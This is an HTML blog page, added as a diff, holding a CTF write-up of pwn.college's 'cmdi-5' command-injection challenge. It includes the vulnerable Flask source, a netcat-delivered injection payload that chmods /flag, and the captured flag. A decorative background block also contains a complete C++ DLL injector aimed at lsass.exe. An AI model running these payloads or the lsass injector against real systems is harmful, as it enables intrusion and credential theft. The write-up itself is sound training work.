@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💉 Command Injection 5 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="💉 Command Injection 5 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>💉 Command Injection 5 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧩 Challenge Overview</h2>
+
+<p><strong>Category:</strong> Web Exploitation<br />
+<strong>Challenge Name:</strong> cmdi-5<br />
+<strong>Platform:</strong> pwn.college<br />
+<strong>Goal:</strong> Exploit a command injection vulnerability in the <code class="language-plaintext highlighter-rouge">/test</code> endpoint to run arbitrary shell commands and retrieve the flag.</p>
+
+<hr />
+
+<h2 id="-source-code-analysis">📝 Source Code Analysis</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/opt/pwn.college/python
+</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">flask</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/test</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
+    <span class="n">arg</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">path</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/challenge/PWN</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">touch </span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="sh">"</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">DEBUG: </span><span class="si">{</span><span class="n">command</span><span class="o">=</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+        <span class="n">command</span><span class="p">,</span>  <span class="c1"># the command to run
+</span>        <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>  <span class="c1"># use the shell to run this command
+</span>        <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>  <span class="c1"># capture the standard output
+</span>        <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>  <span class="c1"># 2&gt;&amp;1
+</span>        <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">latin</span><span class="sh">"</span><span class="p">,</span>  <span class="c1"># capture the resulting output as text
+</span>    <span class="p">).</span><span class="n">stdout</span>
+
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+        &lt;html&gt;&lt;body&gt;
+        Welcome to the touch service! Please choose a file to touch:
+        &lt;form action=</span><span class="sh">"</span><span class="s">/test</span><span class="sh">"</span><span class="s">&gt;&lt;input type=text name=path&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;
+        &lt;hr&gt;
+        &lt;b&gt;Ran </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">!&lt;/b&gt;&lt;br&gt;
+        &lt;/body&gt;&lt;/html&gt;
+        </span><span class="sh">"""</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">geteuid</span><span class="p">())</span>
+<span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">PATH</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><span class="sh">"</span>
+<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">SERVER_NAME</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">challenge.localhost:80</span><span class="sh">"</span>
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">challenge.localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+</code></pre></div></div>
+<hr />
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The value of the path query parameter is directly used in a shell command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">command</span> <span class="o">=</span> f<span class="s2">"touch {arg}"</span>
+</code></pre></div></div>
+<p>Since shell=True is used, this allows command injection via shell metacharacters like ;, &amp;&amp;, or |.</p>
+
+<hr />
+<h2 id="exploit">Exploit</h2>
+
+<p>We’ll inject a command using ; to escalate privileges on the flag file and make it readable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /test?path=hello;chmod+777+/flag+%%23 HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<h3 id="breakdown">Breakdown:</h3>
+<ul>
+  <li>hello → Dummy file name</li>
+  <li>;chmod+777+/flag+%23 → Injected command to make /flag world-readable
+    <ul>
+      <li>
+        <ul>
+          <li>becomes space</li>
+        </ul>
+      </li>
+      <li>%23 is # (to comment out remaining shell line)</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="final-step">Final Step</h2>
+<p>Now simply read the flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /flag
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>cqMqQmTFOTppp1fqR5JAEzmpj-G.QX3YTN2wSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+<hr />
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
